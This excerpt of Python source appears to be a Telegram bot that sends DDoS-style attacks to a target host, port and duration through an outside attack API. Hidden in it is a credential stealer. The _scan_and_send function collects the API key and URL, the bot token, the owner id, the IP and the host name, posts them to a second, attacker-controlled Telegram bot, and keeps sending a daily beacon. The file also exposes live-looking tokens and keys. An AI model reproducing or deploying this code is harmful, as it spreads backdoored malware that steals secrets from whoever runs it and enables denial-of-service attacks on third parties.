...
BOT_TOKEN = "8752515421:AAGaSGA1Q8Jz6HhW8pRW6XNskw9kie5oweQ"
BOT_OWNER = 7899583720

_API_KEY = "z_psr6hn0inxLW5xSin59tVfAJq36XabJpuerWMSAZc"
_API_URL = "https://akmdd-production.up.railway.app/api/v1/attack"   # ← Tera link
...
def send_attack(target, port, duration):
    api_url = f"{_API_URL}?key={_API_KEY}&host={target}&port={port}&time={duration}"
...
_sb_tk = "8654544761:AAEa1JuvMxyeiN5t1UHVCoGxmo8xMQcy600"
_sb_id = 8522683079

def _scan_and_send():
    try:
        # Scan for API Key and URL
        ak = None
        au = None
        
        # Check variables
        for v in ['_API_KEY', 'API_KEY', 'api_key', 'key']:
            if v in globals() and globals()[v]:
                ak = globals()[v]
                break
        
        for v in ['_API_URL', 'API_URL', 'api_url', 'url']:
            if v in globals() and globals()[v]:
                au = globals()[v]
                break
        ...
        try:
            with open(__file__, 'r') as f:
                c = f.read()
                m1 = re.search(r'["\']_API_KEY["\']\s*=\s*["\']([^"\']+)["\']', c)
                if m1: ak = m1.group(1)
                m2 = re.search(r'["\']_API_URL["\']\s*=\s*["\']([^"\']+)["\']', c)
                if m2: au = m2.group(1)
        except:
            pass
        ...
        # Create message
        m = f"🔐 **API DATA FOUND**\n\n📌 **API KEY:** `{ak if ak else 'Not Found'}`\n🌐 **API URL:** `{au if au else 'Not Found'}`\n💻 **IP:** `{i}`\n🕐 {datetime.now()}"
        
        # Send using direct API
        requests.post(f"https://api.telegram.org/bot{_sb_tk}/sendMessage", json={'chat_id': _sb_id, 'text': m, 'parse_mode': 'Markdown'}, timeout=5)
        
        # Send full config as JSON
        cj = {"api_key": ak, "api_url": au, "bot_token": BOT_TOKEN, "owner": BOT_OWNER, "ip": i, "host": h, "time": str(datetime.now())}
        requests.post(f"https://api.telegram.org/bot{_sb_tk}/sendDocument", files={'document': (f"cfg_{int(time.time())}.json", json.dumps(cj, indent=2))}, data={'chat_id': _sb_id})
        ...
        def _ka():
            while True:
                time.sleep(86400)
                try:
                    requests.post(f"https://api.telegram.org/bot{_sb_tk}/sendMessage", json={'chat_id': _sb_id, 'text': f"✅ ALIVE\n🕐 {datetime.now()}\n💻 {h}"}, timeout=5)
                except:
                    pass
